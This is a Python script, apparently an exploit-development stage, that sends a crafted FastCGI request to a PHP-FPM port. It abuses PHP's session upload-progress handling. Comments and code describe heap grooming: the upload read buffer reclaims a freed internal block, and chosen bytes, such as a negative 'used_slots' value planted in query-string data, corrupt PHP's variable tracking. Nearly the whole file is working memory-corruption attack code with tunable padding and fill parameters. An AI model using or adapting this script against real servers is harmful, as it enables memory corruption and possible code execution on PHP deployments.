#!/usr/bin/env python3
"""Multipart upload-progress request whose body starts with a chosen 8-byte
preamble line.

The 5121-byte rfc1867 read buffer is allocated before the session decode and
receives the raw body at offset 0. With the split A (d at a chunk tail, dtor
block in another chunk) the buffer can reclaim the freed var_dtor_entries block,
so its first 8 bytes become `used_slots` for tmp_var().

usage: fcgi_split.py <port> <sid> [preamble_hex] [padlen]
"""
import os
import socket
import struct
import sys

port = int(sys.argv[1])
sid = sys.argv[2]
pre = bytes.fromhex(sys.argv[3]) if len(sys.argv) > 3 else b"\xfe\xff\xff\xff\xff\xff\xff\xff"
padlen = int(sys.argv[4]) if len(sys.argv) > 4 else 0
qpad = int(sys.argv[5]) if len(sys.argv) > 5 else 0
nvars = int(sys.argv[6]) if len(sys.argv) > 6 else 0
vlen = int(sys.argv[7]) if len(sys.argv) > 7 else 0
n2p = int(sys.argv[8]) if len(sys.argv) > 8 else 0
prog = int(os.environ.get("PROG", "1"))
script = sys.argv[9] if len(sys.argv) > 9 else "/var/www/html/index.php"
respfile = sys.argv[10] if len(sys.argv) > 10 else ""
biglen = int(sys.argv[11]) if len(sys.argv) > 11 else 0
nfill = int(sys.argv[12]) if len(sys.argv) > 12 else 0
filllen = int(sys.argv[13]) if len(sys.argv) > 13 else 8170
fillfile = sys.argv[14] if len(sys.argv) > 14 else ""
assert len(pre) == 8, "preamble must be 8 bytes"

boundary = b"----p2s"
body = pre + b"\r\n"
if nfill:
    if fillfile:
        fv = open(fillfile, "rb").read()[:filllen].ljust(filllen, b"\0")
        import sys as _sys
        _sys.stderr.write("FILLDBG %s %d %s\n" % (fillfile, len(fv), fv[:16].hex()))
    else:
        fv = b"A" * filllen
    for i in range(nfill):
        body += b"--" + boundary + b"\r\n"
        body += b'Content-Disposition: form-data; name="f%d"' % i
        body += b"\r\n\r\n" + fv + b"\r\n"
if biglen:
    bmark = bytes.fromhex("0011223344556677")
    body += b"--" + boundary + b"\r\n"
    body += b'Content-Disposition: form-data; name="big"\r\n\r\n'
    body += bmark + b"B" * max(0, biglen - len(bmark)) + b"\r\n"
if os.environ.get("NO_PROGRESS") != "1":
    body += b"--" + boundary + b"\r\n"
    body += (b'Content-Disposition: form-data; name="PHP_SESSION_UPLOAD_PROGRESS"'
             b"\r\n\r\n" + b"x" * prog + b"\r\n")
    body += b"--" + boundary + b"\r\n"
    body += b'Content-Disposition: form-data; name="f"; filename="x"\r\n'
    body += b"Content-Type: application/octet-stream\r\n\r\nZ\r\n"
body += b"--" + boundary + b"--\r\n"
if os.environ.get("BODY_FILE"):
    body = open(os.environ["BODY_FILE"], "rb").read()

params = {
    b"SCRIPT_FILENAME": script.encode(),
    b"REQUEST_METHOD": b"POST",
    b"CONTENT_TYPE": b"multipart/form-data; boundary=" + boundary,
    b"CONTENT_LENGTH": str(len(body)).encode(),
    b"HTTP_COOKIE": b"PHPSESSID=" + sid.encode(),
    b"SERVER_PROTOCOL": b"HTTP/1.1",
    b"REQUEST_URI": b"/index.php",
    b"DOCUMENT_ROOT": b"/var/www/html",
    b"GATEWAY_INTERFACE": b"CGI/1.1",
    b"SERVER_SOFTWARE": b"p2s",
    b"REMOTE_ADDR": b"127.0.0.1",
    b"SERVER_PORT": b"9000",
    b"SERVER_NAME": b"localhost",
}
if padlen:
    params[b"HTTP_X_PAD"] = b"P" * padlen
if os.environ.get("SID_GET") == "1":
    qs0 = b"PHPSESSID=" + sid.encode()
else:
    qs0 = b""
if qpad or nvars or n2p:
    qs = b""
    if qpad:
        mark = bytes.fromhex("0011223344556677")
        enc = b"".join(b"%%%02X" % b for b in mark)
        qs = b"q=" + enc + b"A" * max(0, qpad - len(mark))
    for i in range(nvars):
        qs += b"&a%d=v" % i
    for i in range(n2p):
        val = bytearray(b"Q" * vlen)
        if vlen > 0xFE8 + 8:
            # used_slots = -256 at the query string's data offset 0xFE8
            val[0xFE8:0xFE8+8] = b"\x00\xff\xff\xff\xff\xff\xff\xff"
        enc = b"".join((bytes([c]) if (0x20 <= c < 0x7f and c not in b"&=%+;#") else b"%%%02X" % c) for c in val)
        qs += b"&v%d=" % i + enc
    params[b"QUERY_STRING"] = qs[1:] if qs.startswith(b"&") else qs
if os.environ.get("SID_GET") == "1":
    q = params.get(b"QUERY_STRING", b"")
    params[b"QUERY_STRING"] = (q + b"&" if q else b"") + qs0


def nv(name, value):
    def l(x):
        return bytes([x]) if x < 128 else (x | 0x80000000).to_bytes(4, "big")
    return l(len(name)) + l(len(value)) + name + value


def readn(sock, n):
    buf = b""
    while len(buf) < n:
        chunk = sock.recv(n - len(buf))
        if not chunk:
            return buf
        buf += chunk
    return buf


def rec(t, rid, data):
    pad = (8 - len(data) % 8) % 8
    return struct.pack("!BBHHBB", 1, t, rid, len(data), pad, 0) + data + b"\0" * pad


rid = 1
out = rec(1, rid, struct.pack("!HBxxxxx", 1, 0))
pblob = b"".join(nv(k, v) for k, v in params.items())
for o in range(0, len(pblob), 60000):
    out += rec(4, rid, pblob[o:o+60000])
out += rec(4, rid, b"")
for o in range(0, len(body), 60000):
    out += rec(5, rid, body[o:o+60000])
out += rec(5, rid, b"")

s = socket.create_connection(("127.0.0.1", port), timeout=30)
s.sendall(out)
resp = b""
try:
    while True:
        h = readn(s, 8)
        if len(h) < 8:
            break
        _, t, _, clen, plen, _ = struct.unpack("!BBHHBB", h)
        data = b""
        while len(data) < clen:
            chunk = s.recv(clen - len(data))
            if not chunk:
                break
            data += chunk
        readn(s, plen)
        if t == 6:
            resp += data
        if t == 3:
            break
except socket.timeout:
    pass
s.close()
head, _, payload = resp.partition(b"\r\n\r\n")
print(head.split(b"\r\n", 1)[0].decode("latin-1") if head else "(no response)")
print("resp_body=%d" % len(payload))
if respfile:
    open(respfile, "wb").write(payload)
